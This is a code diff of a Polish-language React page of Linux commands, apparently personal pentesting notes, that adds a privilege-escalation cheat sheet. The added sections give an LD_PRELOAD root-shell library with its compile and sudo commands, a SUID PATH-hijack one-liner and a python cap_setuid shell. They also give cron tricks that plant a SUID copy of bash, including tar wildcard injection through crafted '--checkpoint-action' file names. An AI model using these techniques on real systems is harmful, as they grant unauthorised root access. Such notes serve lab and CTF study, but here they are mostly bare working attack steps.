@@ -134,6 +134,10 @@ const LinuxCommands = () => {
                     <td>Znajdź pliki binarne z ustawionym bitem SETGID</td>
                     </tr>
                     <tr>
+                    <td>find / -group management -exec ls -l {} \; 2{`>`}/dev/null</td>
+                    <td>Znajdź pliki dla grupy managment</td>
+                    </tr>
+                    <tr>
                     <td><code>echo $PATH</code></td>
                     <td>Sprawdź zawartość zmiennej PATH bieżącego użytkownika</td>
                     </tr>
@@ -152,6 +156,64 @@ const LinuxCommands = () => {
 
                 </tbody>
             </table>
+
+            <details>
+                <summary>LD_PRELOAD</summary>
+                <div className='waring'>
+                    <p>#include {`<stdio.h>`}</p>
+                    <p>#include {`<sys/types.h>`}</p>
+                    <p>#include {`<stdlib.h>`}</p>
+                    <br />
+                    <p>void _init(){`{`}</p>
+                    <p className='tab-1'>unsetenv("LD_PRELOAD");</p>
+                    <p className='tab-1'>setgid(0);</p>
+                    <p className='tab-1'>setuid(0);</p>
+                    <p className='tab-1'>system("/bin/bash");</p>
+                    <p>{`}`}</p>
+                </div>
+                <p>gcc -fPIC -shared -o {`<Nazwa output>`} shell.c -nostartfiles</p>
+                <p>sudo LD_PRELOAD={`<Pełna lokalizacja>`} {`<Jakiś servis z sudo -l>`}</p>
+            </details>
+
+            <details>
+                <summary>.c escalation</summary>
+                <div className='waring'>
+                    <p>echo 'int main() {`{`} setgid(0); setuid(0); system("/bin/bash"); return 0;{`}`}'</p>
+                </div>
+                <p>gcc /tmp/service.c -o /tmp/service</p>
+                <p>export PATH=/tmp:$PATH</p>
+                <p>{'<Ścieżka pliku znalezionego przez -find / -type f -perm 04000 -ls 2>/dev/null >'}</p>
+            </details>
+
+            <details>
+                <summary>getcap</summary>
+                <p>getcap -r / 2{'>'}/dev/null</p>
+                <div className='waring'>
+                    <p>/usr/bin/python2.6 = cap_setuid+ep</p>
+                    <p>...</p>
+                </div>
+                <p>/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'</p>
+            </details>
+
+            <details>
+                <summary>cron</summary>
+                <p>echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' {`>`} {'<Nadpisujący się plik>'}</p>
+                <p>chmod +x {'<Nadpisujący się plik>'}</p>
+                <br />
+                <p>Po zrobienu kopii</p>
+                <p>/tmp/bash -p</p>
+                <br />
+                <p>----------</p>
+                <br />
+                <p>Gdy mamy skrypt który robi backup np. <span className='important'>tar czf /tmp/backup.tar.gz *</span></p>
+                <p>echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' {`>`} {'<Dowolna nazwa scriptu .sh>'}</p>
+                <p>chmod +x {'<Utworzonego scriptu>'}</p>
+                <p>touch {`<Pełna ścieżka do forlderu wszystkich scriptów>`}/--checkpoint=1</p>
+                <p>touch {`<Pełna ścieżka do forlderu wszystkich scriptów>`}/--checkpoint-action=exec=sh/{`<Utworzonego scriptu>`}</p>
+                <br />
+                <p>Czekamy aż cron wykona pliki</p>
+                <p>/tmp/bash -p</p>
+            </details>
         </section>
     )
 };
